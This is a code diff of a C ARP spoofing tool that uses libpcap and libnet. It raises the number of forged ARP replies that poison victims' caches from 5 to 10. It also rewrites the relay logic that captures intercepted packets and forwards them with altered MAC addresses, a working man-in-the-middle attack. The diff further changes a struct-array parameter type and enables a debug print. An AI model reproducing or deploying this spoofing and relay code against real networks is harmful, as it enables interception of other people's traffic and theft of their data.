@@ -6,23 +6,23 @@
 
 void *infect(void *arg){
     struct spoof_arg *my_arg=(spoof_arg *)arg;
-    for(int i=0;i<5;i++) {
+    for(int i=0;i<10;i++) {
         arp_reply(my_arg->handle, my_arg->src_ip, my_arg->dst_ip, my_arg->my_mac, my_arg->src_mac);
     }
     sleep(infect_time);
 }
 
-void *f_arpspoof(pcap_t *handle,spoof_arg **sa,int pair){
+void f_arpspoof(pcap_t *handle,spoof_arg *sa,int pair){
     int res;
     while (true) {
         res=spoof_packet(handle,sa, pair);
         if(res==-1)
             break;
-        //puts("-----------------------------------------------");
+        puts("-----------------------------------------------");
     }
 }
 
-bool spoof_packet(pcap_t* handle,spoof_arg **sa,int pair){
+bool spoof_packet(pcap_t* handle,spoof_arg *sa,int pair){
 
     struct pcap_pkthdr* header;
     const u_char* packet;
@@ -41,13 +41,13 @@ bool spoof_packet(pcap_t* handle,spoof_arg **sa,int pair){
 
     ipv4_h=(libnet_ipv4_hdr*)(packet+LIBNET_ETH_H);
     for(i=0;i<pair;i++) {
-        if (!memcmp(&ipv4_h->ip_src, &sa[i]->src_ip, 4) && !memcmp(&ipv4_h->ip_dst, &sa[i]->dst_ip, 4)) {
+        if (!memcmp(&ipv4_h->ip_src, &sa[i].src_ip, 4) && !memcmp(&ipv4_h->ip_dst, &sa[i].dst_ip, 4)) {
             //spoofed packet
 
 
             //relay packet
-            memcpy(eth_h->ether_shost, sa[i]->my_mac, ETHER_ADDR_LEN);
-            memcpy(eth_h->ether_dhost, sa[i]->dst_mac, ETHER_ADDR_LEN);
+            memcpy(eth_h->ether_shost, sa[i].my_mac, ETHER_ADDR_LEN);
+            memcpy(eth_h->ether_dhost, sa[i].dst_mac, ETHER_ADDR_LEN);
             pcap_sendpacket(handle, packet, header->len);
             break;
         }
